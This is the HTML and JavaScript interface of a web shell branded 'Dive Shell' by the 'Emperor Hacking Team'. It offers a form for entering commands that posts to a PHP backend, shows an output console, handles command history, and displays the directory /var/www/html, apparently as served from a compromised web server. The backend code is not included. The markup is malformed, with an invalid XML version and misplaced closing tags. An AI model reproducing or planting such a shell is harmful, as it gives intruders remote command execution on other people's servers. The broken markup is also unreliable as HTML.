<?xml version="Dive.0.1" encoding="UTF-8"?>

<head>
  <title>Dive Shell - Emperor Hacking Team</title>
  <link rel="stylesheet" href="Simshell.css" type="text/css" />

  <script type="text/javascript" language="JavaScript">
  var current_line = 0;
  var command_hist = new Array("");
  var last = 0;

  function key(e) {
    if (!e) var e = window.event;

    if (e.keyCode == 38 && current_line < command_hist.length-1) {
      command_hist[current_line] = document.shell.command.value;
      current_line++;
      document.shell.command.value = command_hist[current_line];
    }

    if (e.keyCode == 40 && current_line > 0) {
      command_hist[current_line] = document.shell.command.value;
      current_line--;
      document.shell.command.value = command_hist[current_line];
    }

  }

function init() {
  document.shell.setAttribute("autocomplete", "off");
  document.shell.output.scrollTop = document.shell.output.scrollHeight;
  document.shell.command.focus();
}

  </script>
</head>

<body   onload="init()" style="color: #00FF00; background-color: #000000">

<span style="background-color: #FFFFFF">



</body>

</body>
</html>



</span>



<p><font color="#FF0000"><span style="background-color: #000000">&nbsp;Directory: </span> <code>
<span style="background-color: #000000">/var/www/html</span></code>
</font></p>

<form name="shell" action="/Dive_Shell_1.0_Emperor_Hacking_Team.php" method="POST" style="border: 1px solid #808080">
<div style="width: 989; height: 456">
  <p align="center"><b>
  <font color="#C0C0C0" face="Tahoma">Command:</font></b><input class="prompt" name="command" type="text"
                onkeyup="key(event)" size="88" tabindex="1" style="border: 4px double #C0C0C0; ">
  <input type="submit" value="Submit" /> &nbsp;<font color="#0000FF">
  </font>
  &nbsp;<textarea name="output" readonly="readonly" cols="107" rows="22" style="color: #FFFFFF; background-color: #000000">
</textarea> </p>
<p class="prompt" align="center">
  <b><font face="Tahoma" color="#C0C0C0">Rows:</font><font face="Tahoma" color="#0000FF" size="2"> </font></b> 
  <input type="text" name="rows" value="" size="5" /></p>
<p class="prompt" align="center">
  <b><font color="#C0C0C0" face="SimSun">Edited By Emperor Hacking Team</font></b></p>
<p class="prompt" align="center">
  <font face="Tahoma" size="2" color="#808080">iM4n - FarHad - imm02tal - R$P</font><font color="#808080"><br>
&nbsp;</font></p>
</div>
</form>


<p class="prompt" align="center">
  <b><font color="#000000">&nbsp;</font><font color="#000000" size="2"> </font>
  </b></p>



</html>
